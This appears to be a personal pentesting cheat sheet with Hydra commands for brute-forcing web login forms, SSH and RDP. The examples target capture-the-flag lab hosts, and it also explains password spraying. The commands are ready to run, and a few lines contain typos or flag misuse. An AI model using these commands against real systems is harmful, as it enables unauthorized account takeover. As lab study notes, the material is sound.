
## Hydra

Password bruteforcing is hydra.

### Web App Login
``` shell
hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form "<loginurl>:username=^USER^&pass=^PASS^&Cookie=<cookie>:Login Failed"
```

###### Example exploits steps
![[Pasted image 20250422152033.png]]

```
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong" -V
```


### SSH

The following attack uses the wordlist.txt file to bruteforce the admin user for SSH login.

```shell
hydra -l think -P /home/mystic/Downloads/test/htb/password.txt  -t 4 ssh://10.10.13.243
```

If the password is know, It could be used the tecnnique **password spraying** where the passwords remain constant and the username is bruteforced. This is useful if we gain passwords from a dataleak.

### RDP

A RDP attack could be this

```shell
hydra -L Administrator -P wordlist.txt <target-ip> rdp -t 4
```

